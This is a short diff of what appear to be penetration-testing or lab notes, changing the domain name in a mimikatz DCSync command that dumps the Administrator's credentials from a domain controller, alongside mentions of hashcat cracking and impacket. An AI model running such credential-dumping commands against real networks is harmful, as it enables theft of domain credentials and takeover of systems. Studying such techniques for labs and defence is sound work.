@@ -131,7 +131,7 @@ then crack the pass with hashcat
 
 against the admin
 
-    mimikatz# lsadump::dcsync /user:corp\Administrator
+    mimikatz# lsadump::dcsync /user:beyond\Administrator
 
 with impacket providing a user with access and the domain controller
 
